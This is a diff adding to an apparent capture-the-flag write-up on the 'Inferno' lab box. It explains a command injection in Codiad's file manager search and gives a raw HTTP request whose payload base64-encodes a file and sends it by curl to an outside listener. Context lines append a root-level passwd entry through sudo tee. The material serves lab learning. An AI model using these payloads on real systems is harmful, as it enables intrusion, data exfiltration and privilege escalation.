@@ -37,6 +37,8 @@ In order to get it functioning, I modded the `exploit.py` file so whenever it us
  
 Once I got a shell, I noted that it would periodically close, probably due to a cronjob somewhere. It looked like every minute. I was able to work with this however.
 
+> **NOTE**: I go into detail on how this exploit works and alternatives at the end.
+
 In the home directory was dante's folder, with the local.txt file being unreadable. I ran a `ls -laR` which found, under `/Downloads`, a `.download.dat`. In very CTF fashion (not real life pentest at all) this contained hexadecimal characters which I ran through cyberchef to reveal `dante`'s password.
 
 At this point I dropped the exploit shell and just ssh'd in, getting the first flag.
@@ -44,3 +46,38 @@ At this point I dropped the exploit shell and just ssh'd in, getting the first f
 Getting to root was easy: `sudo -l` revealed the user could run `/usr/bin/tee` as root without a password (even though I had the password). Tee sends its input to two outputs, and can both write and append. Being able to use it as root means I could use it to append to the `passwd` file, and I used a handy entry I keep around for just such an occasion which i put into a file called pass: `cat pass | sudo /usr/bin/tee -a /etc/passwd` with pass containing: `user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/bin/bash` (which has password `pass123`).
 
 Once done, I just `su user3` with `pass123` to escalate to root. The final proof.txt was in /root. Easy.
+
+## The codiad exploit.
+
+If you're not a fan of scripts from random github repos, or want to exploit this yourself, heres how. Its actually not too hard, based on a blatant RCE, so you could get that `.download.dat` purely with something like burp, if you wished.
+
+The vulnerable code is in the filemanager class, which you can browse via the codiad interface, specifically the files /components/filemanager/controller.php and /components/filemanager/class.filemanager.php. The first takes the action as a query parameter then uses the appropriate method from the second, in this case the search function.
+
+The vulnerability is on line 243 of the filemanager class, within the search function:
+
+  `$output = shell_exec('find -L ' . $this->path . ' -iregex  ".*' . $this->search_file_type  . '" -type f | xargs grep -i -I -n -R -H "' . $input . '"');`
+
+Here, search filetype is one of the body parameters, along with the search term, and you can see its being concatted to a os command without escaping. So its basic command injection.
+
+To exploit this is a bit tricky, since its blind: you can't get the response back through the call, at least as far as I could tell. Instead, you can use a trick: fire up a webserver on an accessible machine, e.g, via `python3 -m http.server 4444`.
+
+Then, you can exfiltrate data, by passing a command like `cat /home/dante/Downloads/.download.dat | base64 -w0 | xargs -I T curl 10.10.126.249:4444/?x=T`, which will read that download.dat file, base 64 encode it, then pass it to a curl request to your webserver (where you will see the request arrive with a big payload in the querystring).
+
+So, back to the vulnerable component: to call this, and do the above, here is the raw http request. Its basically a post to that controller endpoint, with the basic auth header, and the (unencoded!) body:
+
+```http
+POST /inferno/components/filemanager/controller.php?type=1&action=search&path=/var/www/html/inferno HTTP/1.1
+Host: 10.10.71.248
+User-Agent: python-requests/2.23.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Authorization: Basic YWRtaW46ZGFudGUx
+Cookie: 99300f2078c94e495d72b82a732ea6db=gu0fv4ear8rsifistrnrcnes1o
+Content-Length: 140
+
+search_string=Hacker&search_file_type="%0Acat /home/dante/Downloads/.download.dat | base64 -w0 | xargs -I T curl 10.10.126.249:4444/?x=T %23
+```
+
+Note you will need to log into codiad to get that cookie.
